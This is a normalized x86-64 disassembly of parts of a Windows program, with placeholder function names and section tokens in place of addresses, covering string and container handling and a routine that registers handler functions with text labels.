mov rcx [ rbx - 0x40 ]
call j_sub_14003ad04
cmp [ rbx ] 0x8
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_140015130
cmp rcx rdx
je r-xdata
retn
push r12
sub rsp 0x30
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] r13
mov r12 rdx
xor r13d r13d
lea rdi [ rcx + 0x50 ]
mov [ rdi ] r13
mov [ rdi + 0x8 ] r13
mov [ rdi + 0x10 ] r13
cmp [ rdi - 0x10 ] 0x8
jb r-xdata
mov rbp [ rdi + 0x8 ]
cmp rsi rbp
je r-xdata
mov [ rdi - 0x10 ] 0x7
mov [ rdi - 0x18 ] r13
mov [ rdi - 0x28 ] r13w
cmp [ rdi - 0x38 ] 0x8
jb r-xdata
mov rcx [ rdi - 0x28 ]
call j_sub_14003ad04
mov rcx [ rdi ]
call j_sub_14003ad04
lea rbx [ rsi + 0x48 ]
mov [ rdi - 0x38 ] 0x7
mov [ rdi - 0x40 ] r13
mov [ rdi - 0x50 ] r13w
add rdi 0x70
lea rax [ rdi - 0x50 ]
cmp rax r12
jne r-xdata
mov rcx [ rdi - 0x50 ]
call j_sub_14003ad04
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] r13
mov [ rbx - 0x18 ] r13w
cmp [ rbx - 0x28 ] 0x8
jb r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
mov rsi [ rdi ]
test rsi rsi
je r-xdata
mov r13 [ rsp + 0x20 ]
mov rdi [ rsp + 0x28 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop r12
mov [ rbx - 0x28 ] 0x7
mov [ rbx - 0x30 ] r13
add rsi 0x58
mov [ rbx - 0x40 ] r13w
add rbx 0x58
cmp rsi rbp
jne r-xdata
mov rcx [ rbx - 0x40 ]
call j_sub_14003ad04
cmp [ rbx ] 0x8
jb r-xdata
sub_140015250
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov rbx rdx
mov rdi rcx
mov [ rcx + 0x18 ] 0x7
xor esi esi
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rcx [ rdi + 0x28 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
lea rdx [ rbx + 0x28 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rdx [ rbx + 0x50 ]
lea rcx [ rdi + 0x50 ]
call sub_1400152e0
nop
mov rax rdi
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_1400152e0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov rsi rdx
mov rdi rcx
xor ecx ecx
mov [ rdi ] rcx
mov [ rdi + 0x8 ] rcx
mov [ rdi + 0x10 ] rcx
mov r8 [ rdx + 0x8 ]
sub r8 [ rdx ]
mov rax 0x2e8ba2e8ba2e8ba3
imul r8
mov rbx rdx
sar rbx 0x4
mov rax rbx
shr rax 0x3f
add rbx rax
mov [ rdi ] rcx
mov [ rdi + 0x8 ] rcx
mov [ rdi + 0x10 ] rcx
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rax 0x2e8ba2e8ba2e8ba
cmp rbx rax
jbe r-xdata
mov rcx rbx
call sub_1400153a0
mov [ rdi ] rax
mov [ rdi + 0x8 ] rax
imul rbx rbx 0x58
add rbx rax
mov [ rdi + 0x10 ] rbx
mov r8 rax
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_140015530
mov [ rdi + 0x8 ] rax
lea rcx [ r--data ]
call sub_1400378ec
sub_1400153a0
sub rsp 0x48
xor eax eax
test rcx rcx
je r-xdata
add rsp 0x48
retn
mov rax 0x2e8ba2e8ba2e8ba
cmp rcx rax
ja r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] 0x0
call sub_14003a774
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_14003f22c
int3
imul rcx rcx 0x58
call sub_14003ac60
test rax rax
jne r-xdata
sub_140015410
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x48 ] 0x8
mov rbx rcx
jb r-xdata
xor edi edi
mov [ rbx + 0x48 ] 0x7
mov [ rbx + 0x40 ] rdi
mov [ rbx + 0x30 ] di
cmp [ rbx + 0x20 ] 0x8
jb r-xdata
mov rcx [ rcx + 0x30 ]
call j_sub_14003ad04
mov [ rbx + 0x20 ] 0x7
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x8 ] di
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x8 ]
call j_sub_14003ad04
sub_140015470
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x70
mov [ rsp + 0x60 ] rbx
add rdi 0x70
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
mov rcx rbx
call sub_140001dd0
nop
lea rcx [ rbx + 0x28 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
lea rdx [ rdi + 0x28 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rdx [ rdi + 0x50 ]
lea rcx [ rbx + 0x50 ]
call sub_1400152e0
nop
cmp rdi rsi
je r-xdata
sub_140015530
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rdi rcx
mov [ rsp + 0x78 ] rbx
xor esi esi
nop [ rax ] eax
mov rax rbx
add rsp 0x40
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x30 ] rbx
test rbx rbx
je r-xdata
add rbx 0x58
mov [ rsp + 0x70 ] rbx
add rdi 0x58
mov [ rsp + 0x60 ] rdi
jmp r-xdata
mov rax [ rdi ]
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
lea rdx [ rdi + 0x8 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rcx [ rbx + 0x30 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
lea rdx [ rdi + 0x30 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
mov rdx [ rsp + 0x68 ]
mov rdi [ rsp + 0x60 ]
cmp rdi rdx
je r-xdata
sub_1400155f0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov rbx rdx
mov rdi rcx
mov rax [ rdx ]
mov [ rcx ] rax
add rcx 0x8
mov [ rcx + 0x18 ] 0x7
xor esi esi
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
add rdx 0x8
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rcx [ rdi + 0x30 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
lea rdx [ rbx + 0x30 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
mov rax rdi
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_140015680
mov rax rsp
push rbp
lea rbp [ rax - 0x258 ]
sub rsp 0x350
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x240 ] rax
mov rbx rcx
mov [ rsp + 0x28 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_140015f50 ]
mov [ rbp ] rax
mov [ rbp + 0x20 ] 0x7
mov [ rbp + 0x18 ] rdi
mov [ rbp + 0x8 ] di
xor r8d r8d
lea edx [ rdi + 0xd ]
lea rcx [ rbp + 0x8 ]
call sub_1400025a0
lea r11 [ rbp + 0x8 ]
cmp [ rbp + 0x20 ] 0x8
cmovae r11 [ rbp + 0x8 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
movzx eax [ r--data ]
mov [ r11 + 0x18 ] ax
mov [ rbp + 0x18 ] 0xd
lea rax [ rbp + 0x8 ]
cmp [ rbp + 0x20 ] 0x8
cmovae rax [ rbp + 0x8 ]
mov [ rax + 0x1a ] di
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x1e ]
lea rcx [ rbp + 0x30 ]
call sub_1400025a0
lea r11 [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae r11 [ rbp + 0x30 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
mov eax [ r--data ]
mov [ r11 + 0x38 ] eax
mov [ rbp + 0x40 ] 0x1e
lea rax [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rax [ rbp + 0x30 ]
mov [ rax + 0x3c ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140016340 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
xor r8d r8d
lea edx [ rdi + 0xa ]
lea rcx [ rbp - 0x58 ]
call sub_1400025a0
lea r11 [ rbp - 0x58 ]
cmp [ rbp - 0x40 ] 0x8
cmovae r11 [ rbp - 0x58 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov eax [ r--data ]
mov [ r11 + 0x10 ] eax
mov [ rbp - 0x48 ] 0xa
lea rax [ rbp - 0x58 ]
cmp [ rbp - 0x40 ] 0x8
cmovae rax [ rbp - 0x58 ]
mov [ rax + 0x14 ] di
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x1a ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea r11 [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae r11 [ rbp - 0x30 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov eax [ r--data ]
mov [ r11 + 0x30 ] eax
mov [ rbp - 0x20 ] 0x1a
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x34 ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140016770 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
xor r8d r8d
lea edx [ rdi + 0x10 ]
lea rcx [ rsp + 0x48 ]
call sub_1400025a0
lea r11 [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae r11 [ rsp + 0x48 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov [ rsp + 0x58 ] 0x10
lea rax [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae rax [ rsp + 0x48 ]
mov [ rax + 0x20 ] di
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x15 ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea r11 [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae r11 [ rsp + 0x70 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
movzx eax [ r--data ]
mov [ r11 + 0x28 ] ax
mov [ rbp - 0x80 ] 0x15
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x2a ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140016300 ]
mov [ rbp + 0x1e0 ] r11
mov [ rbp + 0x200 ] 0x7
mov [ rbp + 0x1f8 ] rdi
mov [ rbp + 0x1e8 ] di
lea r8d [ rdi + 0x8 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1e8 ]
call sub_140001ea0
nop
mov [ rbp + 0x228 ] 0x7
mov [ rbp + 0x220 ] rdi
mov [ rbp + 0x210 ] di
lea r8d [ rdi + 0x1c ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x210 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x1e0 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140016990 ]
mov [ rbp + 0x120 ] r11
mov [ rbp + 0x140 ] 0x7
mov [ rbp + 0x138 ] rdi
mov [ rbp + 0x128 ] di
lea r8d [ rdi + 0x12 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x128 ]
call sub_140001ea0
nop
mov [ rbp + 0x168 ] 0x7
mov [ rbp + 0x160 ] rdi
mov [ rbp + 0x150 ] di
lea r8d [ rdi + 0x17 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x150 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x120 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140016320 ]
mov [ rbp + 0x60 ] r11
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
lea r8d [ rdi + 0xa ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_140001ea0
nop
mov [ rbp + 0xa8 ] 0x7
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea r8d [ rdi + 0x10 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x90 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140018980 ]
mov [ rbp + 0x180 ] r11
mov [ rbp + 0x1a0 ] 0x7
mov [ rbp + 0x198 ] rdi
mov [ rbp + 0x188 ] di
lea r8d [ rdi + 0x8 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x188 ]
call sub_140001ea0
nop
mov [ rbp + 0x1c8 ] 0x7
mov [ rbp + 0x1c0 ] rdi
mov [ rbp + 0x1b0 ] di
lea r8d [ rdi + 0x61 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1b0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x180 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140018360 ]
mov [ rbp + 0xc0 ] r11
mov [ rbp + 0xe0 ] 0x7
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
lea r8d [ rdi + 0x9 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xc8 ]
call sub_140001ea0
nop
mov [ rbp + 0x108 ] 0x7
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
lea r8d [ rdi + 0x4f ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0xc0 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
mov [ rbp + 0x108 ] 0x7
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf0 ]
call j_sub_14003ad04
mov [ rbp + 0xe0 ] 0x7
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
cmp [ rbp + 0x1c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
mov [ rbp + 0x1c8 ] 0x7
mov [ rbp + 0x1c0 ] rdi
mov [ rbp + 0x1b0 ] di
cmp [ rbp + 0x1a0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1b0 ]
call j_sub_14003ad04
mov [ rbp + 0x1a0 ] 0x7
mov [ rbp + 0x198 ] rdi
mov [ rbp + 0x188 ] di
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x188 ]
call j_sub_14003ad04
mov [ rbp + 0xa8 ] 0x7
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp + 0x168 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
mov [ rbp + 0x168 ] 0x7
mov [ rbp + 0x160 ] rdi
mov [ rbp + 0x150 ] di
cmp [ rbp + 0x140 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x150 ]
call j_sub_14003ad04
mov [ rbp + 0x140 ] 0x7
mov [ rbp + 0x138 ] rdi
mov [ rbp + 0x128 ] di
cmp [ rbp + 0x228 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x128 ]
call j_sub_14003ad04
mov [ rbp + 0x228 ] 0x7
mov [ rbp + 0x220 ] rdi
mov [ rbp + 0x210 ] di
cmp [ rbp + 0x200 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x210 ]
call j_sub_14003ad04
mov [ rbp + 0x200 ] 0x7
mov [ rbp + 0x1f8 ] rdi
mov [ rbp + 0x1e8 ] di
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1e8 ]
call j_sub_14003ad04
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x240 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x350 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
sub_140015f50
mov rax rsp
push r12
push r13
push r14
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
mov ecx 0x20
call sub_14003ac60
mov rdi rax
xor esi esi
test rax rax
je r-xdata
mov rdi rsi
mov [ rax ] rsi
mov [ rax + 0x8 ] rsi
mov [ rax + 0x10 ] rsi
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x28 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x40 ] 0x8
jb r-xdata
mov rbx [ rdi ]
cmp rbx [ rdi + 0x8 ]
je r-xdata
lea rdx [ r--data ]
lea r13 [ rw-data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rcx rdi
call sub_1400033f0
mov r14d 0x4
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
nop [ rax + rax ] ax
test rdi rdi
je r-xdata
mov edx 0xa
mov rcx r13
call sub_1400085e0
mov ebx esi
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r13 + 0x10 ] 0x6
jne r-xdata
mov rax [ r12 ]
movsxd rcx [ rax + 0x4 ]
add rcx r12
test ebp ebp
je r-xdata
mov rcx [ rcx + r12 + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove ebp r14d
mov al 0x1
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov rbx [ rdi ]
test rbx rbx
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r13
test ebx ebx
je r-xdata
mov rcx [ rcx + r13 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove ebx r14d
mov rax [ rw-data ]
add rbx 0x28
cmp rbx [ rdi + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebp
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov [ rdi ] rsi
mov [ rdi + 0x8 ] rsi
mov [ rdi + 0x10 ] rsi
mov rcx rdi
call j_sub_14003ad04
mov rbp [ rdi + 0x8 ]
cmp rbx rbp
je r-xdata
mov rcx rdi
call sub_140007150
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rbp rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov ebx esi
mov rcx [ rbp ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rbp + 0x10 ] 0x6
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov edx 0x9
mov rcx r13
call sub_14000fe50
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov r12 rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov ebp esi
mov rcx [ r12 ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + r12 + 0x10 ] 0x6
jne r-xdata
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx r14d
mov rcx [ rdi ]
call j_sub_14003ad04
nop [ rax + rax ] eax
mov rax [ rbp ]
movsxd rcx [ rax + 0x4 ]
add rcx rbp
test ebx ebx
je r-xdata
mov rcx [ rcx + rbp + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove ebx r14d
xor r8d r8d
call sub_140003120
or edx 0x4
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
add rbx 0x28
cmp rbx rbp
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rcx rdi
call sub_140005200
test al al
je r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x28 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x40 ] 0x8
jb r-xdata
mov rbx [ rdi ]
cmp rbx [ rdi + 0x8 ]
je r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
nop [ rax ] eax
mov rax [ r12 ]
movsxd rcx [ rax + 0x4 ]
add rcx r12
test ebp ebp
je r-xdata
mov rcx [ rcx + r12 + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove ebp r14d
add rbx 0x28
cmp rbx [ rdi + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebp
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov edx 0x9
mov rcx r13
call sub_14000fe50
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov r12 rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov ebp esi
mov rcx [ r12 ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + r12 + 0x10 ] 0x6
jne r-xdata
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_140016340
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x5f ]
sub rsp 0xe0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
xor r13d r13d
mov [ rsp + 0x20 ] r13d
mov rdx [ rcx ]
xor r8d r8d
cmp rdx [ rcx + 0x8 ]
jne r-xdata
mov [ rbp - 0x11 ] 0x7
mov [ rbp - 0x19 ] r13
mov [ rbp - 0x29 ] r13w
or r9 0xffffffffffffffff
lea rcx [ rbp - 0x29 ]
call sub_140001dd0
lea rbx [ rbp - 0x29 ]
mov edi 0x2
mov [ rbp - 0x61 ] 0x7
mov [ rbp - 0x69 ] r13
mov [ rbp - 0x79 ] r13w
lea edx [ r13 + 0x1e ]
lea rcx [ rbp - 0x79 ]
call sub_1400025a0
lea r11 [ rbp - 0x79 ]
cmp [ rbp - 0x61 ] 0x8
cmovae r11 [ rbp - 0x79 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
mov eax [ r--data ]
mov [ r11 + 0x38 ] eax
mov [ rbp - 0x69 ] 0x1e
lea rax [ rbp - 0x79 ]
cmp [ rbp - 0x61 ] 0x8
cmovae rax [ rbp - 0x79 ]
mov [ rax + 0x3c ] r13w
lea rbx [ rbp - 0x79 ]
lea edi [ r13 + 0x1 ]
jmp r-xdata
test dil 0x2
je r-xdata
mov [ rbp - 0x39 ] 0x7
mov [ rbp - 0x41 ] r13
mov [ rbp - 0x51 ] r13w
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
